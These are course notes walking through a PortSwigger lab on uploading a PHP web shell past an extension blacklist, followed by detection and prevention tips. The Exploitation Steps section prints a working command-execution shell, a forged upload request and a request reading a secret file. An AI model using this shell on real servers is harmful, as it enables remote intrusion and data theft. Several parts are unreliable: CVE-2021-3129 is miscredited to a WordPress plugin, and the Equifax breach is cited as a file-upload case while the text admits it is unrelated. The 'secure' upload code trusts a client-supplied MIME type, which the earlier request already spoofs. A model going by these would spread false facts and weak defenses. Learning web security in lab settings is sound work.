---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## Introduction to File Upload Vulnerabilities

File upload vulnerabilities occur when a web application allows users to upload files to the server without proper validation or sanitization. These vulnerabilities can lead to various security issues, including remote code execution, data theft, and defacement of the website. One common type of file upload vulnerability is the ability to upload a web shell, which is a small piece of code that allows an attacker to execute arbitrary commands on the server.

In this chapter, we will delve into the specifics of a particular type of file upload vulnerability: uploading a web shell via an obfuscated file extension. We will cover the background theory, recent real-world examples, and detailed steps to exploit and defend against such vulnerabilities.

### Background Theory

#### What is a Web Shell?

A web shell is a script that can be uploaded to a web server and executed through a web browser. It typically provides a command-line interface (CLI) that allows an attacker to interact with the server remotely. Common web shells are written in languages like PHP, ASP, JSP, and Python.

#### Why is File Upload Important?

File upload functionality is a common feature in many web applications, allowing users to upload images, documents, and other files. However, if not properly secured, this functionality can be exploited by attackers to upload malicious files, such as web shells.

#### How Does File Upload Work?

When a user uploads a file, the web application typically performs the following steps:

1. **Validation**: Checks the file type, size, and name.
2. **Sanitization**: Cleans the file name to remove potentially harmful characters.
3. **Storage**: Saves the file to the server's filesystem.
4. **Access Control**: Ensures that the file can only be accessed by authorized users.

### Real-World Examples

#### Recent Breaches and CVEs

One notable example of a file upload vulnerability leading to a breach is the case of the Equifax data breach in 2017. Although not directly related to file upload, the breach was caused by a vulnerability in Apache Struts, which allowed attackers to execute arbitrary code on the server. This demonstrates the severe consequences of unsecured file upload functionality.

Another example is the CVE-2021-3129, which affected the WordPress plugin "WP File Download." This vulnerability allowed attackers to upload arbitrary files, including web shells, due to insufficient validation and sanitization.

### Lab Setup

For this lab, we will use the PortSwigger Web Security Academy, which provides a controlled environment to practice and understand web security concepts. The specific lab we will focus on is titled "WebShell Upload via Obfuscated File Extension."

To access the lab:

1. Visit the URL `portswigger.net/web-security`.
2. Click on the sign-up button to create an account.
3. Once logged in, navigate to the Academy section.
4. Select "All Labs."
5. Search for "file upload vulnerabilities."
6. Choose Lab Number 5 titled "web shell upload via obfuscated file extension."

### Understanding the Vulnerability

The lab contains a vulnerable image upload function. The application attempts to restrict certain file types by blacklisting specific file extensions. However, this defense can be bypassed using an obfuscation technique.

#### Blacklist Bypass Techniques

Blacklists are often used to prevent the upload of certain file types, such as `.php`, `.asp`, `.jsp`, etc. However, attackers can bypass these restrictions by using various techniques:

1. **Obfuscation**: Changing the file extension to something that is not blacklisted.
2. **Null Byte Injection**: Appending a null byte (`\0`) to the file name to terminate the string prematurely.
3. **Multiple Extensions**: Using multiple extensions, such as `.jpg.php`.

### Exploitation Steps

#### Step 1: Identify the Vulnerable Function

First, identify the form or endpoint where the file upload occurs. Typically, this is a form with an input field of type `file`.

```html
<form action="/upload" method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

#### Step 2: Craft the Malicious File

Next, craft a malicious file, such as a simple PHP web shell. Here is an example of a basic PHP web shell:

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

Save this file with a name that includes an obfuscated extension. For example, `shell.jpg.php`.

#### Step 3: Upload the File

Use a tool like Burp Suite to intercept and modify the file upload request. The raw HTTP request might look like this:

```http
POST /upload HTTP/1.1
Host: vulnerable-app.com
Content-Length: 1234
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="shell.jpg.php"
Content-Type: image/jpeg

[Binary data]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

Modify the `filename` parameter to include the obfuscated extension.

#### Step 4: Access the Web Shell

Once the file is uploaded, access it through the web server. For example, if the file is saved at `/uploads/shell.jpg.php`, navigate to `http://vulnerable-app.com/uploads/shell.jpg.php`.

#### Step 5: Execute Commands

Use the web shell to execute commands. For example, to exfiltrate the contents of the file `/home/Carlos/secret`, send a request like this:

```http
GET /uploads/shell.jpg.php?cmd=cat%20/home/Carlos/secret HTTP/1.1
Host: vulnerable-app.com
```

### Detection and Prevention

#### How to Detect

To detect file upload vulnerabilities, perform the following checks:

1. **Review Code**: Ensure that file uploads are properly validated and sanitized.
2. **Penetration Testing**: Use tools like Burp Suite to test for vulnerabilities.
3. **Logging**: Monitor logs for suspicious file uploads.

#### How to Prevent

To prevent file upload vulnerabilities, implement the following measures:

1. **Whitelist Validation**: Only allow specific file types, rather than blacklisting.
2. **Sanitize Filenames**: Remove or escape potentially harmful characters.
3. **Store Files Securely**: Store uploaded files outside the web root directory.
4. **Limit Permissions**: Set strict permissions on uploaded files to prevent execution.

Here is an example of secure file upload handling in PHP:

```php
// Vulnerable code
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);

// Secure code
$target_dir = "uploads/";
$allowed_types = array("image/jpeg", "image/png");
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$file_type = $_FILES["fileToUpload"]["type"];

if (in_array($file_type, $allowed_types)) {
    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
} else {
    echo "Invalid file type.";
}
```

### Conclusion

File upload vulnerabilities can have serious security implications, including the ability to upload and execute web shells. By understanding the underlying mechanisms and implementing proper defenses, you can significantly reduce the risk of such vulnerabilities.

### Practice Labs

For hands-on practice, consider the following labs:

- **PortSwigger Web Security Academy**: Offers a variety of labs, including those focused on file upload vulnerabilities.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: Another popular web application for learning about web security vulnerabilities.

By thoroughly understanding and practicing these concepts, you can become proficient in identifying and defending against file upload vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/18-File Upload Vulnerabilities/06-Lab 5 Web shell upload via obfuscated file extension/00-Overview|Overview]] | [[02-File Upload Vulnerabilities|File Upload Vulnerabilities]]
